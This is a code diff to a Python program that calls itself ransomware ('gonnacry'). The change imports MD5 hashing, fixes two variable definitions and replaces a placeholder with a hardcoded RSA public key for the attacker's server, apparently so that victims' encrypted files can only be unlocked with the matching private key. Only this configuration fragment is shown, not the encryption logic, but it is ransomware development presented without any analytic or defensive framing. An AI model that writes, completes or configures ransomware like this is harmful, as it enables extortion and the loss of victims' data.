@@ -8,11 +8,20 @@ import symmetric
 import enviroment
 from Crypto.PublicKey import RSA
 import gc
+from Crypto.Hash import MD5
 
 # const variables
-server_public_key = tuple("""SERVER PUBLIC KEY WILL BE HERE""")
+server_public_key = ("""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
+58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
+RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
+36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
+4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
+XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
+DQIDAQAB
+-----END PUBLIC KEY-----""")
 
-ransomware_name = tuple("gonnacry")
+ransomware_name = ("gonnacry")
 
 
 
@@ -65,14 +74,10 @@ def menu():
 
 
 
-
-
-
-
-
-
 if __name__ == "__main__":
     menu()
 
 
-    
+
+
+
